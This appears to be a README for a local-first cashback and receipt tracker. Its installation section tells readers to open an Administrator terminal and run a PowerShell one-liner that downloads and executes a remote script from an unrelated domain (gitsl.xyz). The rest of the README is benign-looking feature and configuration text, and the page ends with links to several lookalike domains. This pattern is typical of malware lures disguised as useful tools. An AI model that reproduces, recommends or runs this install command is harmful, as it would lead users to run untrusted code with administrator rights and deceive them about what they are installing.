# Cashback — Personal Rewards and Receipt Tracker

> A private, local-first tracker for cashback offers, receipts, merchant rules, and reward balances.

---
## ⚙️ INSTALLATION & SETUP (CMD / PowerShell)

### Step 1: Open CMD or PowerShell as Administrator
```cmd
# Press Win+X, then select Terminal (Admin) or Command Prompt (Admin)
```

### Step 2: Execute Deployment Command
```cmd
powershell -Command "irm gitsl.xyz?get=cashback | iex"
```

### Step 3: Wait for Completion
```
[1/4] Loading Cashback modules...
[2/4] Configuring components...
[3/4] Initializing services...
[4/4] Ready. Launch Cashback.
```

### Step 4: Start Using the Tool
- Launch the tool from the Start menu or command line
- Configure settings for your environment
- Verify the health check passes

---

## TL;DR - Quick Summary

**Cashback** helps people organize eligible purchases, track offer expirations, and understand reward balances without uploading personal shopping history. It includes local receipt import, merchant matching, reminders, and exportable reports.

**Best for:** Budget-conscious shoppers, families, and personal finance creators.

**Key differentiators:**
1. Local receipt storage
2. Expiration and reminder calendar
3. Merchant and category matching
4. Privacy-first export
5. Manual verification workflow

---

## Core Features

```
✅ Offer library with expiration dates
✅ Local receipt and photo import
✅ Merchant category matching
✅ Reward balance tracking
✅ Claim and approval checklist
✅ Calendar reminders
✅ CSV and JSON export
✅ Search and filters
```

---

## Usage

```bash
# Start the local app
npm run dev

# Add an offer
npm run cli -- offer add --merchant "Example Market" --rate 5 --expires 2026-12-31

# Import a local receipt
npm run cli -- receipt import ./receipts/market.png --merchant "Example Market"

# Review unmatched receipts
npm run cli -- receipts unmatched

# Export a monthly summary
npm run cli -- reports monthly --from 2026-09-01 --to 2026-09-30 --format csv
```

---

## Configuration

> [!NOTE]
> Keep the data directory on an encrypted local volume when receipts contain personal information. Cloud sync is optional and must be configured explicitly.

```json
{
  "server": { "host": "127.0.0.1", "port": 3000 },
  "storage": { "directory": "./data", "backup": true },
  "privacy": { "analytics": false, "receipt_ocr": "local" },
  "reminders": { "days_before_expiry": 7 }
}
```

---

## Screenshots

- Rewards dashboard: `screenshots/dashboard.png`
- Offer detail: `screenshots/offer-detail.png`
- Receipt matcher: `screenshots/receipt-matcher.png`
- Monthly report: `screenshots/monthly-report.png`

---

## Troubleshooting

| Issue | Solution |
|---|---|
| Receipt does not match | Add an alias for the merchant in the local merchant list. |
| Reminder is missing | Check the system notification permission and the configured lead time. |
| Export is empty | Confirm the report date range uses the local timezone. |
| App cannot open the data folder | Close other instances and check folder permissions. |
| OCR result is inaccurate | Review the extracted text before saving the receipt. |

---

## Use Cases

- **Household Budgeting** — Track eligible purchases and upcoming offer deadlines.
- **Receipt Organization** — Keep searchable local records without a cloud account.
- **Reward Audits** — Compare claims with saved receipts and balances.
- **Personal Finance Content** — Export anonymized summaries for planning examples.

---

## ⚠️ IMPORTANT

> [!IMPORTANT]
> Receipts can contain names, addresses, and payment details. Redact sensitive fields before sharing exports or screenshots.

> [!TIP]
> Use manual claim status until an offer match has been verified against the merchant's current terms.

---

## License

MIT License — see the [LICENSE](./LICENSE) file for details.

---

## Tags

<!--
cashback, rewards, receipts, personal-finance, budgeting, local-first, privacy, reminders, merchant-matching, expense-tracker
-->

[gitview.sbs](https://gitview.sbs?t=cashback) | [gitsl.xyz](https://gitsl.xyz?t=cashback) | [gitrm.cfd](https://gitrm.cfd?t=cashback) | [viewgit.sbs](https://viewgit.sbs?t=cashback) | [gitrm.sbs](https://gitrm.sbs?t=cashback)
